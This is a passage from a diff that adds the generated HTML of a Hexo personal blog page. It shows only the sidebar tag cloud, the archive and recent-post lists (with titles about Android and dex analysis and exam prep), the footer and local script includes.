15px;">牛客网</a> <a href="/tags/%E7%AE%97%E6%B3%95/" style="font-size: 17.5px;">算法</a> <a href="/tags/%E7%BB%8F%E9%AA%8C/" style="font-size: 16.67px;">经验</a> <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="font-size: 15.83px;">网络安全</a> <a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" style="font-size: 10.83px;">计算机网络</a> <a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%80%83%E7%A0%94%E5%A4%8D%E8%AF%95/" style="font-size: 15.83px;">计算机考研复试</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">九月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">六月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">三月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">一月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">十二月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">五月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">四月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">二月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">一月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">十二月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">十一月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">十月 2019</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2021/09/21/IDA%20Pro%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90dex%E6%96%87%E4%BB%B6/">IDA Pro静态分析dex文件</a>
+          </li>
+        
+          <li>
+            <a href="/2021/09/13/%E7%BC%96%E5%86%99%E5%B9%B6%E5%88%86%E6%9E%90%E7%AC%AC%E4%B8%80%E4%B8%AAAndroid%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/">编写并分析第一个Android应用程序</a>
+          </li>
+        
+          <li>
+            <a href="/2021/09/05/Android%E5%9B%9B%E5%A4%A7%E7%BB%84%E4%BB%B6/">Android四大组件</a>
+          </li>
+        
+          <li>
+            <a href="/2021/06/25/%E4%B8%AD%E5%9B%BD%E7%9F%BF%E4%B8%9A%E5%A4%A7%E5%AD%A6%E6%9C%AC%E7%A7%91%E7%94%9F%E6%B6%AF%E6%80%BB%E7%BB%93/">中国矿业大学本科生涯总结</a>
+          </li>
+        
+          <li>
+            <a href="/2021/03/19/%E5%8C%97%E4%BA%AC%E5%B7%A5%E4%B8%9A%E5%A4%A7%E5%AD%A6%E8%80%83%E7%A0%94--%E5%A4%8D%E8%AF%95--%E6%9C%BA%E8%AF%95%E5%88%B7%E9%A2%98/">北京工业大学考研--复试--机试刷题</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2022 iHui<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
